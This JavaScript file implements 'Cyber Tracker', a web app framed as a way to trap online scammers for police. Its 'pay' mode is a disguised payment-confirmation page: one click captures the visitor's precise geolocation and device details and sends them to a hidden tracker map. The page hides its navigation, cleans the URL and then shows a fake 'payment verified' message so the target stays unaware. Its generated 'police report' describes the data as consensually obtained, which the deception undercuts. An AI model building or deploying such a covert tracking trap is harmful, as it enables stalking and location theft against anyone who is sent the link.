/**
 * Cyber Tracker - Police Assistance & Online Scam Location Trap
 * Built with HTML5 Geolocation API, Leaflet.js, Nominatim Geocoding, & PeerJS / BroadcastChannel
 */

// Global Application State
const STATE = {
  currentMode: 'pay', // 'pay' (User 1 - Target) | 'tracker' (User 2 - Police Radar)
  roomId: 'LOC-8821',
  isSoundEnabled: true,
  isScanning: false,
  locationsHistory: [],
  peer: null,
  peerConnections: [],
  broadcastChannel: null,
  receiverMap: null,
  receiverMarkers: {},
  activePoliceReportText: ''
};

// ==========================================
// 1. INITIALIZATION & LIFECYCLE
// ==========================================
document.addEventListener('DOMContentLoaded', () => {
  initUrlParams();
  initLocalStorage();
  initBroadcastChannel();
  initPeerSync();
  initMaps();
  updateReceiverFeed();

  // Check saved theme
  const savedTheme = localStorage.getItem('loc_sender_theme') || 'dark';
  document.documentElement.setAttribute('data-theme', savedTheme);
});

/**
 * Read URL parameters (?mode=pay|tracker & ?room=XYZ)
 */
function initUrlParams() {
  const params = new URLSearchParams(window.location.search);
  const modeParam = params.get('mode');
  const roomParam = params.get('room');

  if (roomParam && roomParam.trim() !== '') {
    STATE.roomId = roomParam.trim().toUpperCase();
    const roomInput = document.getElementById('room-id-input');
    if (roomInput) roomInput.value = STATE.roomId;
  }

  if (modeParam === 'tracker' || modeParam === 'receiver' || modeParam === 'police') {
    switchMode('tracker');
  } else {
    switchMode('pay');
  }
}

/**
 * Load initial location history from localStorage
 */
function initLocalStorage() {
  try {
    const saved = localStorage.getItem('cyber_trap_history_' + STATE.roomId);
    if (saved) {
      STATE.locationsHistory = JSON.parse(saved);
    }
  } catch (err) {
    console.warn('Gagal membaca riwayat localStorage:', err);
  }

  // Listen for storage events from other tabs
  window.addEventListener('storage', (e) => {
    if (e.key === 'cyber_trap_history_' + STATE.roomId && e.newValue) {
      try {
        const newData = JSON.parse(e.newValue);
        STATE.locationsHistory = newData;
        updateReceiverFeed();
        refreshReceiverMapMarkers();
      } catch (err) {}
    }
  });
}

/**
 * Save history to localStorage
 */
function saveHistoryToStorage() {
  try {
    localStorage.setItem('cyber_trap_history_' + STATE.roomId, JSON.stringify(STATE.locationsHistory));
  } catch (err) {
    console.warn('Gagal menyimpan riwayat:', err);
  }
}

/**
 * Switch between User 1 (Pay Trap) and User 2 (Police Tracker) mode
 */
function switchMode(mode) {
  STATE.currentMode = mode;

  const appNavbar = document.getElementById('app-navbar');
  const btnPay = document.getElementById('btn-mode-pay');
  const btnTracker = document.getElementById('btn-mode-tracker');
  const viewPay = document.getElementById('view-pay');
  const viewTracker = document.getElementById('view-tracker');

  if (mode === 'tracker') {
    // Tampilkan Navbar untuk User 2
    if (appNavbar) appNavbar.style.display = 'flex';
    
    btnPay.classList.remove('active');
    btnTracker.classList.add('active', 'active-receiver');

    viewPay.classList.remove('active');
    viewTracker.classList.add('active');

    // Refresh Leaflet receiver map sizes after tab switch
    setTimeout(() => {
      if (STATE.receiverMap) {
        STATE.receiverMap.invalidateSize();
        fitReceiverMapBounds();
      }
    }, 200);

  } else {
    // Sembunyikan Navbar untuk User 1 (Target / Penipu) agar tidak curiga
    if (appNavbar) appNavbar.style.display = 'none';

    btnTracker.classList.remove('active', 'active-receiver');
    btnPay.classList.add('active');

    viewTracker.classList.remove('active');
    viewPay.classList.add('active');
  }

  // Update URL tanpa parameter yang mencurigakan untuk User 1 (Target)
  if (mode === 'pay') {
    const cleanUrl = window.location.pathname.replace(/\/user2\/?.*$/, '') || '/';
    window.history.replaceState({ path: cleanUrl }, '', cleanUrl);
  } else {
    const newUrl = `${window.location.pathname}?mode=${mode}`;
    window.history.replaceState({ path: newUrl }, '', newUrl);
  }
}

// ==========================================
// 2. REALTIME SYNCHRONIZATION ENGINE
// ==========================================

/**
 * BroadcastChannel for 0-latency sync across browser tabs/windows
 */
function initBroadcastChannel() {
  try {
    STATE.broadcastChannel = new BroadcastChannel('cyber_trap_channel_' + STATE.roomId);
    STATE.broadcastChannel.onmessage = (event) => {
      const data = event.data;
      if (data && data.type === 'NEW_LOCATION') {
        handleIncomingLocation(data.payload, false);
      } else if (data && data.type === 'CLEAR_HISTORY') {
        STATE.locationsHistory = [];
        updateReceiverFeed();
        refreshReceiverMapMarkers();
      }
    };
  } catch (err) {
    console.log('BroadcastChannel tidak didukung di browser ini.');
  }
}

/**
 * PeerJS (WebRTC P2P Cloud) for cross-device real-time sync
 */
function initPeerSync() {
  const dot = document.getElementById('room-status-dot');
  if (dot) {
    dot.classList.remove('offline');
    dot.title = `Tersambung ke Room ${STATE.roomId}`;
  }

  if (STATE.peer) {
    try { STATE.peer.destroy(); } catch (e) {}
  }

  try {
    const peerPrefix = 'ahe-cybertrap-2026-room-' + STATE.roomId.replace(/[^a-zA-Z0-9]/g, '');
    STATE.peer = new Peer({
      config: {
        'iceServers': [
          { url: 'stun:stun.l.google.com:19302' },
          { url: 'stun:stun1.l.google.com:19302' }
        ]
      }
    });

    STATE.peer.on('open', (id) => {
      console.log('PeerJS Tersambung dengan ID:', id);
      if (dot) {
        dot.classList.remove('offline');
        dot.title = `Online - Sesi Investigasi Aktif di Room ${STATE.roomId}`;
      }
    });

    STATE.peer.on('connection', (conn) => {
      STATE.peerConnections.push(conn);
      conn.on('data', (data) => {
        if (data && data.type === 'NEW_LOCATION') {
          handleIncomingLocation(data.payload, false);
        }
      });
    });

    STATE.peer.on('error', (err) => {
      console.warn('PeerJS P2P Cloud Info:', err.type);
    });
  } catch (err) {
    console.warn('PeerJS Init warning:', err);
  }
}

/**
 * Broadcast location to all listeners (tabs & peers)
 */
function broadcastNewLocation(locData) {
  if (STATE.broadcastChannel) {
    STATE.broadcastChannel.postMessage({
      type: 'NEW_LOCATION',
      payload: locData
    });
  }

  if (STATE.peerConnections && STATE.peerConnections.length > 0) {
    STATE.peerConnections.forEach(conn => {
      try {
        conn.send({ type: 'NEW_LOCATION', payload: locData });
      } catch (e) {}
    });
  }
}

/**
 * Change active room ID
 */
function changeRoomId(newRoomId) {
  const cleanId = newRoomId.trim().toUpperCase() || 'LOC-8821';
  STATE.roomId = cleanId;
  const roomInput = document.getElementById('room-id-input');
  if (roomInput) roomInput.value = STATE.roomId;

  initLocalStorage();
  initBroadcastChannel();
  initPeerSync();
  updateReceiverFeed();
  refreshReceiverMapMarkers();

  showToast('Kode Sesi Berubah', `Sekarang berada di Room: ${STATE.roomId}`, 'info');

  const newUrl = `${window.location.pathname}?mode=${STATE.currentMode}&room=${STATE.roomId}`;
  window.history.replaceState({ path: newUrl }, '', newUrl);
}

// ==========================================
// 3. TARGET LOCATION TRAP (USER 1 ENGINE)
// ==========================================

/**
 * Triggered when Target (User 1) clicks "KONFIRMASI PEMBAYARAN"
 */
async function handleConfirmPayment() {
  if (STATE.isScanning) return;

  const btnConfirm = document.getElementById('btn-confirm-payment');
  const btnText = document.getElementById('btn-pay-text');
  const spinner = document.getElementById('btn-pay-spinner');
  const statusBox = document.getElementById('payment-status-message');
  const msgTitle = document.getElementById('pay-msg-title');
  const msgDesc = document.getElementById('pay-msg-desc');

  STATE.isScanning = true;
  btnConfirm.disabled = true;
  if (spinner) spinner.style.display = 'inline-block';
  if (btnText) btnText.textContent = 'MEMVERIFIKASI PEMBAYARAN...';

  if (!navigator.geolocation) {
    finishPaymentUI('Pembayaran Sedang Diverifikasi', 'Sistem sedang memproses verifikasi transaksi Anda. Terima kasih.');
    return;
  }

  // Collect digital forensics from target browser
  const forensics = {
    userAgent: navigator.userAgent || 'Unknown Browser',
    platform: navigator.platform || 'Unknown OS',
    screenRes: `${window.screen.width}x${window.screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Asia/Jakarta',
    language: navigator.language || 'id-ID'
  };

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
      const acc = Math.round(position.coords.accuracy);
      const timestamp = new Date().toISOString();

      // Reverse geocode to get street address
      const address = await reverseGeocode(lat, lng);

      const locData = {
        id: 'trap_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
        senderName: 'Target Terdeteksi (#TRAP-' + Math.floor(1000 + Math.random() * 9000) + ')',
        lat: lat,
        lng: lng,
        accuracy: acc,
        address: address,
        timestamp: timestamp,
        room: STATE.roomId,
        forensics: forensics
      };

      // Store locally & broadcast to User 2
      handleIncomingLocation(locData, true);
      broadcastNewLocation(locData);

      // Finish with a normal payment confirmation message (target does not know coordinates were sent)
      finishPaymentUI(
        'Verifikasi Pembayaran Berhasil',
        'Pembayaran pesanan Anda telah berhasil dikonfirmasi dan sedang diproses oleh sistem. Terima kasih.'
      );
    },
    (error) => {
      // Even if location permission fails, show standard payment verification message
      finishPaymentUI(
        'Pembayaran Dalam Pemeriksaan',
        'Permintaan konfirmasi pembayaran telah dikirim ke sistem untuk pengecekan otomatis.'
      );
    },
    {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    }
  );
}

/**
 * Reverse Geocode coordinates to address using Nominatim API
 */
async function reverseGeocode(lat, lng) {
  try {
    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;
    const response = await fetch(url, {
      headers: {
        'Accept-Language': 'id, en'
      }
    });
    if (!response.ok) throw new Error('Geocode API Error');
    const data = await response.json();
    return data.display_name || `Koordinat TKP: ${lat.toFixed(5)}, ${lng.toFixed(5)}`;
  } catch (err) {
    console.warn('Reverse Geocoding fallback:', err);
    return `Koordinat TKP (${lat.toFixed(5)}, ${lng.toFixed(5)})`;
  }
}

/**
 * Finish Target Payment UI
 */
function finishPaymentUI(title, desc) {
  STATE.isScanning = false;
  const btnConfirm = document.getElementById('btn-confirm-payment');
  const btnText = document.getElementById('btn-pay-text');
  const spinner = document.getElementById('btn-pay-spinner');
  const statusBox = document.getElementById('payment-status-message');
  const msgTitle = document.getElementById('pay-msg-title');
  const msgDesc = document.getElementById('pay-msg-desc');

  if (spinner) spinner.style.display = 'none';
  if (btnText) btnText.textContent = 'KONFIRMASI TERKIRIM ✓';
  if (btnConfirm) btnConfirm.style.background = 'linear-gradient(135deg, #059669, #047857)';
  
  if (msgTitle) msgTitle.textContent = title;
  if (msgDesc) msgDesc.textContent = desc;
  if (statusBox) statusBox.style.display = 'flex';
}

// ==========================================
// 4. MAPS ENGINE (LEAFLET.JS)
// ==========================================

/**
 * Initialize Receiver Leaflet Map
 */
function initMaps() {
  const receiverContainer = document.getElementById('receiver-map');
  if (receiverContainer && !STATE.receiverMap) {
    STATE.receiverMap = L.map('receiver-map', {
      zoomControl: true,
      attributionControl: true
    }).setView([-6.2000, 106.8166], 12);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      maxZoom: 19,
      attribution: '© OpenStreetMap'
    }).addTo(STATE.receiverMap);

    refreshReceiverMapMarkers();
  }
}

/**
 * Custom Pulsing Leaflet Marker Icon
 */
function createBeaconIcon() {
  return L.divIcon({
    className: 'custom-beacon-marker-container',
    html: '<div class="custom-beacon-marker"></div>',
    iconSize: [24, 24],
    iconAnchor: [12, 12],
    popupAnchor: [0, -15]
  });
}

/**
 * Add or update marker on User 2 Receiver Map
 */
function addMarkerToReceiverMap(loc, isNew) {
  if (!STATE.receiverMap) return;

  if (STATE.receiverMarkers[loc.id]) {
    STATE.receiverMap.removeLayer(STATE.receiverMarkers[loc.id]);
  }

  const icon = createBeaconIcon();
  const marker = L.marker([loc.lat, loc.lng], { icon: icon }).addTo(STATE.receiverMap);
  
  const gmapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
  marker.bindPopup(`
    <div style="font-family: var(--font-body); min-width: 240px; color: #0f172a;">
      <div style="font-weight: 700; font-size: 1rem; color: #e11d48; border-bottom: 1px solid #cbd5e1; padding-bottom: 6px; margin-bottom: 6px;">
        🚨 ${escapeHtml(loc.senderName)}
      </div>
      <p style="margin: 0 0 6px 0; font-size: 0.82rem; line-height: 1.4; font-weight: 600;">${escapeHtml(loc.address)}</p>
      <div style="background: #f1f5f9; padding: 6px; border-radius: 4px; font-family: monospace; font-size: 0.72rem; color: #334155; margin-bottom: 8px; word-break: break-all;">
        LAT/LNG: ${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)}<br>
        AKURASI: ±${loc.accuracy}m | ${formatDateTime(loc.timestamp)}
      </div>
      <div style="display: flex; gap: 6px;">
        <a href="${gmapUrl}" target="_blank" style="flex: 1; text-align: center; background: #0284c7; color: #fff; padding: 6px 10px; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 0.8rem;">
          🗺️ Google Maps
        </a>
        <button onclick="openPoliceModalForId('${loc.id}')" style="flex: 1; text-align: center; background: #e11d48; color: #fff; border: none; padding: 6px 10px; border-radius: 6px; font-weight: 600; font-size: 0.8rem; cursor: pointer;">
          📋 Laporan Polisi
        </button>
      </div>
    </div>
  `);

  STATE.receiverMarkers[loc.id] = marker;

  if (isNew) {
    marker.openPopup();
    STATE.receiverMap.setView([loc.lat, loc.lng], 16, { animate: true });
  }
}

/**
 * Refresh all receiver map markers from history
 */
function refreshReceiverMapMarkers() {
  if (!STATE.receiverMap) return;

  Object.values(STATE.receiverMarkers).forEach(m => STATE.receiverMap.removeLayer(m));
  STATE.receiverMarkers = {};

  STATE.locationsHistory.forEach(loc => {
    addMarkerToReceiverMap(loc, false);
  });

  fitReceiverMapBounds();
}

/**
 * Fit receiver map to show all markers
 */
function fitReceiverMapBounds() {
  if (!STATE.receiverMap) return;
  const markers = Object.values(STATE.receiverMarkers);
  if (markers.length === 0) return;

  const group = L.featureGroup(markers);
  STATE.receiverMap.fitBounds(group.getBounds().pad(0.25), { maxZoom: 16 });
}

// ==========================================
// 5. USER 2 CYBER TRACKER FEED CONTROLLER
// ==========================================

/**
 * Handle incoming location confirmation
 */
function handleIncomingLocation(locData, isLocal) {
  const exists = STATE.locationsHistory.some(item => item.id === locData.id);
  if (!exists) {
    STATE.locationsHistory.unshift(locData);
    saveHistoryToStorage();
  }

  updateReceiverFeed();
  addMarkerToReceiverMap(locData, true);

  if (!isLocal || STATE.currentMode === 'tracker') {
    playSirenSound();
  }

  if (!isLocal) {
    showToast(
      '🚨 Target Terlacak!',
      `Koordinat TKP dari ${locData.senderName} masuk ke peta.`,
      'police'
    );
  }
}

/**
 * Render list of locations in User 2 Evidence Feed
 */
function updateReceiverFeed() {
  const container = document.getElementById('locations-list');
  const badge = document.getElementById('feed-counter-badge');
  const emptyState = document.getElementById('feed-empty-state');
  if (!container) return;

  const count = STATE.locationsHistory.length;
  if (badge) {
    badge.textContent = `${count} BUKTI TKP`;
  }

  if (count === 0) {
    if (emptyState) emptyState.style.display = 'block';
    container.innerHTML = `
      <div id="feed-empty-state" class="empty-feed">
        <div class="empty-feed-icon">🚨</div>
        <h4>Belum Ada Data Masuk dari Target</h4>
        <p style="margin-top: 0.5rem; font-size: 0.85rem;">
          Kirimkan link <strong>Konfirmasi Pembayaran</strong> kepada penipu online. Ketika tombol diklik, koordinat &amp; alamat TKP akan langsung muncul di sini.
        </p>
      </div>
    `;
    return;
  }

  let html = '';
  STATE.locationsHistory.forEach((loc, idx) => {
    const isLatest = idx === 0;
    const gmapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
    const ua = (loc.forensics && loc.forensics.userAgent) || 'Unknown User Agent';

    html += `
      <div class="loc-item-card ${isLatest ? 'new-alert' : ''}" onclick="focusOnReceiverLocation('${loc.id}')">
        <div class="loc-card-top">
          <div class="loc-sender-name">
            <span>🚨 ${escapeHtml(loc.senderName)}</span>
          </div>
          <div class="loc-timestamp">
            ${formatDateTime(loc.timestamp)}
          </div>
        </div>

        <div class="loc-address">
          <strong>Alamat TKP:</strong><br>
          ${escapeHtml(loc.address)}
        </div>

        <div class="loc-device-box">
          📱 <strong>Forensik Perangkat Target:</strong><br>
          ${escapeHtml(ua.slice(0, 95))}...<br>
          Resolusi: ${(loc.forensics && loc.forensics.screenRes) || '1080x2400'} | Zona Waktu: ${(loc.forensics && loc.forensics.timezone) || 'Asia/Jakarta'}
        </div>

        <div class="loc-coords-row">
          <span>TKP: ${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)}</span>
          <span>AKURASI: ±${loc.accuracy}m</span>
        </div>

        <div class="loc-card-actions" onclick="event.stopPropagation()">
          <a href="${gmapUrl}" target="_blank" class="btn-mini btn-gmaps">
            🗺️ Google Maps
          </a>
          <button class="btn-mini btn-police" onclick="openPoliceModalForId('${loc.id}')">
            📋 Laporan Polisi
          </button>
        </div>
      </div>
    `;
  });

  container.innerHTML = html;
}

/**
 * Focus receiver map on specific location
 */
function focusOnReceiverLocation(locId) {
  const loc = STATE.locationsHistory.find(l => l.id === locId);
  if (!loc || !STATE.receiverMap) return;

  STATE.receiverMap.setView([loc.lat, loc.lng], 17, { animate: true });
  const marker = STATE.receiverMarkers[locId];
  if (marker) {
    marker.openPopup();
  }

  showToast('Fokus Posisi Target', `Melihat koordinat TKP ${loc.senderName}`, 'info');
}

/**
 * Clear all location history
 */
function clearLocationHistory() {
  if (!confirm('Apakah Anda yakin ingin menghapus seluruh bukti TKP yang tersimpan?')) {
    return;
  }

  STATE.locationsHistory = [];
  saveHistoryToStorage();
  updateReceiverFeed();
  refreshReceiverMapMarkers();

  if (STATE.broadcastChannel) {
    STATE.broadcastChannel.postMessage({ type: 'CLEAR_HISTORY' });
  }

  showToast('Bukti Dihapus', 'Semua koordinat pelacakan telah dibersihkan.', 'info');
}

// ==========================================
// 6. POLICE REPORT GENERATOR MODAL
// ==========================================

/**
 * Open Formal Police Report Modal for a given location ID
 */
function openPoliceModalForId(locId) {
  const loc = STATE.locationsHistory.find(l => l.id === locId);
  if (!loc) return;

  const gmapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
  const f = loc.forensics || {};

  const reportText = 
`=============================================================
           BARANG BUKTI INVESTIGASI LOKASI TARGET
              PELAPORAN CYBER CRIME / SPKT POLRI
=============================================================
NOMOR BUKTI TKP    : ${loc.id.toUpperCase()}
NAMA/ID TARGET     : ${loc.senderName}
WAKTU TERDETEKSI   : ${formatDateTime(loc.timestamp)} (${f.timezone || 'Asia/Jakarta'})

--- 1. KOORDINAT SATELIT GPS (TKP AKTUAL) ---
LATITUDE           : ${loc.lat.toFixed(7)}
LONGITUDE          : ${loc.lng.toFixed(7)}
AKURASI RADAR      : ± ${loc.accuracy} METER
PERKIRAAN ALAMAT   : 
${loc.address}

TAUTAN GOOGLE MAPS : ${gmapUrl}

--- 2. FORENSIK DIGITAL PERANGKAT TARGET ---
USER AGENT / BROWSER: ${f.userAgent || 'Mozilla/5.0'}
PLATFORM / OS      : ${f.platform || 'Android/iOS/Windows'}
RESOLUSI LAYAR     : ${f.screenRes || '1080x2400'}
ZONA WAKTU SISTEM  : ${f.timezone || 'Asia/Jakarta'}

=============================================================
Catatan: Bukti koordinat ini didapatkan melalui persetujuan
geolokasi HTML5 browser target pada waktu kejadian di atas.
=============================================================`;

  STATE.activePoliceReportText = reportText;
  const textarea = document.getElementById('police-report-text');
  if (textarea) textarea.value = reportText;

  const modal = document.getElementById('police-modal');
  if (modal) modal.style.display = 'flex';
}

/**
 * Close Police Report Modal
 */
function closePoliceModal() {
  const modal = document.getElementById('police-modal');
  if (modal) modal.style.display = 'none';
}

/**
 * Copy Police Report Text to clipboard
 */
function copyPoliceReportText() {
  if (!STATE.activePoliceReportText) return;

  if (navigator.clipboard) {
    navigator.clipboard.writeText(STATE.activePoliceReportText).then(() => {
      showToast('Laporan Polisi Disalin! 📋', 'Format laporan resmi berhasil disalin ke clipboard.', 'success');
      closePoliceModal();
    }).catch(() => {
      prompt('Salin teks laporan berikut:', STATE.activePoliceReportText);
    });
  } else {
    prompt('Salin teks laporan berikut:', STATE.activePoliceReportText);
  }
}

// ==========================================
// 7. DEMO SIMULATION & LINK HELPER
// ==========================================

/**
 * Copy Trap Link to send to Scam Target
 */
function copyTrapLink() {
  const baseUrl = window.location.origin + window.location.pathname.replace(/\/user2\/?.*$/, '').replace(/index\.html$/, '');
  const url = (STATE.roomId === 'LOC-8821' || !STATE.roomId) ? baseUrl : `${baseUrl}?room=${STATE.roomId}`;
  
  if (navigator.clipboard) {
    navigator.clipboard.writeText(url).then(() => {
      showToast('Link Jebakan Disalin! 🔗', `Kirim link konfirmasi pembayaran tersebut ke target.`, 'success');
    }).catch(() => {
      prompt('Salin link halaman konfirmasi pembayaran berikut:', url);
    });
  } else {
    prompt('Salin link halaman konfirmasi pembayaran berikut:', url);
  }
}

/**
 * Simulate a Scam Target clicking "Konfirmasi Pembayaran"
 */
function simulateScammerClick() {
  const demoScammers = [
    {
      name: 'Target Terdeteksi (#TRAP-8912)',
      lat: -6.175392,
      lng: 106.827153,
      address: 'Jalan Medan Merdeka Utara, Gambir, Jakarta Pusat, DKI Jakarta, Indonesia',
      forensics: {
        userAgent: 'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        platform: 'Linux armv8l',
        screenRes: '1080x2340',
        timezone: 'Asia/Jakarta'
      }
    },
    {
      name: 'Target Terdeteksi (#TRAP-4401)',
      lat: -6.225014,
      lng: 106.806626,
      address: 'Jalan Jenderal Sudirman, Senayan, Kebayoran Baru, Jakarta Selatan, DKI Jakarta',
      forensics: {
        userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
        platform: 'iPhone',
        screenRes: '1179x2556',
        timezone: 'Asia/Jakarta'
      }
    },
    {
      name: 'Target Terdeteksi (#TRAP-6129)',
      lat: -7.257472,
      lng: 112.752090,
      address: 'Jalan Pemuda, Genteng, Kota Surabaya, Jawa Timur, Indonesia',
      forensics: {
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        platform: 'Win32',
        screenRes: '1920x1080',
        timezone: 'Asia/Jakarta'
      }
    }
  ];

  const pick = demoScammers[Math.floor(Math.random() * demoScammers.length)];

  const locData = {
    id: 'sim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
    senderName: pick.name,
    lat: pick.lat,
    lng: pick.lng,
    accuracy: 6,
    address: pick.address,
    timestamp: new Date().toISOString(),
    room: STATE.roomId,
    forensics: pick.forensics
  };

  handleIncomingLocation(locData, true);
  broadcastNewLocation(locData);

  showToast(
    '⚡ Simulasi Klik Berhasil!',
    `Titik koordinat dan forensik digital dari ${pick.name} berhasil tercatat di peta.`,
    'police'
  );
}

// ==========================================
// 8. UTILITIES & AUDIO SIREN
// ==========================================

/**
 * Synthesize Futuristic Siren Audio Alert using Web Audio API
 */
function playSirenSound() {
  if (!STATE.isSoundEnabled) return;

  try {
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();

    osc.type = 'triangle';
    osc.frequency.setValueAtTime(440, audioCtx.currentTime); // A4
    osc.frequency.linearRampToValueAtTime(880, audioCtx.currentTime + 0.2); // A5
    osc.frequency.linearRampToValueAtTime(440, audioCtx.currentTime + 0.4); // A4

    gain.gain.setValueAtTime(0.22, audioCtx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.45);

    osc.connect(gain);
    gain.connect(audioCtx.destination);

    osc.start();
    osc.stop(audioCtx.currentTime + 0.45);
  } catch (err) {}
}

/**
 * Toggle notification sound
 */
function toggleSound() {
  STATE.isSoundEnabled = !STATE.isSoundEnabled;
  const btn = document.getElementById('btn-toggle-sound');
  if (btn) {
    btn.textContent = STATE.isSoundEnabled ? '🔊' : '🔇';
    btn.title = STATE.isSoundEnabled ? 'Suara Aktif' : 'Suara Nonaktif';
  }
  showToast('Notifikasi Suara', STATE.isSoundEnabled ? 'Suara peringatan DIAKTIFKAN.' : 'Suara peringatan DINONAKTIFKAN.', 'info');
}

/**
 * Toggle Dark / Light Theme
 */
function toggleTheme() {
  const current = document.documentElement.getAttribute('data-theme') || 'dark';
  const nextTheme = current === 'dark' ? 'light' : 'dark';
  document.documentElement.setAttribute('data-theme', nextTheme);
  localStorage.setItem('loc_sender_theme', nextTheme);

  const btn = document.getElementById('btn-toggle-theme');
  if (btn) {
    btn.textContent = nextTheme === 'dark' ? '🌙' : '☀️';
  }
}

/**
 * Show animated toast message
 */
function showToast(title, message, type = '') {
  const container = document.getElementById('toast-container');
  if (!container) return;

  const id = 'toast_' + Date.now();
  const el = document.createElement('div');
  el.id = id;
  el.className = `toast-alert ${type}`;
  el.innerHTML = `
    <div style="font-size: 1.4rem;">${type === 'success' ? '✅' : type === 'info' ? 'ℹ️' : '🚨'}</div>
    <div>
      <div style="font-weight: 700; font-family: var(--font-heading); margin-bottom: 2px;">${escapeHtml(title)}</div>
      <div style="font-size: 0.8rem; color: var(--text-secondary);">${escapeHtml(message)}</div>
    </div>
  `;

  container.appendChild(el);

  setTimeout(() => {
    el.style.opacity = '0';
    el.style.transform = 'translateX(100%)';
    el.style.transition = 'all 0.3s ease';
    setTimeout(() => {
      if (el.parentNode) el.parentNode.removeChild(el);
    }, 300);
  }, 4500);
}

/**
 * Format timestamp to clean date & time
 */
function formatDateTime(isoString) {
  try {
    const dt = new Date(isoString);
    return dt.toLocaleString('id-ID', {
      day: '2-digit',
      month: 'short',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });
  } catch (e) {
    return isoString || '-';
  }
}

/**
 * Escape HTML to prevent XSS
 */
function escapeHtml(str) {
  if (!str) return '';
  return str.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
}
